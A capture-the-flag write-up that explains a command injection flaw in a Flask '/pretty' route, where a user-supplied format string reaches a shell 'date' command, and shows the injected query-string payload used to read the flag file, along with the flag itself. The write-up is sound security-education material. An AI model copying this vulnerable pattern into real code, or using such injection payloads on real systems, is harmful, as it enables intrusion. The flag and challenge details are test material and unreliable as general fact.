# Induction Therapy - web

## Challenge

The citizens of Freedonia are preparing for an upcoming national vote - but before they can make their voices heard, they’ll need to get informed. This challenge drops participants into a voter education web portal where all candidates, policies, and debates are presented for review. Only time will tell who'll you vote for soon...

Provided domain & zip file containing source code.

## Solve

In the source we can see the `pretty()` function is vulnerable to command injection:

```py
@app.route("/pretty")
def pretty():
    fmt = request.args.get("format", "")
    try:
        result = subprocess.check_output(f"date +'{fmt}'", shell=True, stderr=subprocess.STDOUT, timeout=2)
        return f"{result.decode()}"
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode()}", 400
    except Exception as e:
        return f"{str(e)}", 500
```

- `result = subprocess.check_output(f"date +'{fmt}'", shell=True, stderr=subprocess.STDOUT, timeout=2)`
  - Uses Python `subprocess` module to run a shell command and stores output in `result`
  - `subprocess.check_output()` runs command in subprocess
  - `fmt = request.args.get("format", "")` captures format from user
  - `shell=True` runs the command through a shell e.g `bin/sh`
  - `stderr=subprocess.STDOUT` both `stderr` and `stdout` are returned in `result`

Since we control `fmt`, we can inject commands by escaping with `'` and chaining with `;`:

`3.105.27.130:9001/pretty?format=';<further_commands>`

After exploring the file structure I eventually retrieved the flag with:

`3.105.27.130:9001/pretty?format=';cat ../flag.txt'`

<img width="647" height="72" alt="commandinject" src="https://github.com/user-attachments/assets/55de4472-5c31-4087-b9c6-de93924f520a" />


`secedu{th3re_is_4lways_a_t1me_&_plac3_to_bre4k_0u7}`



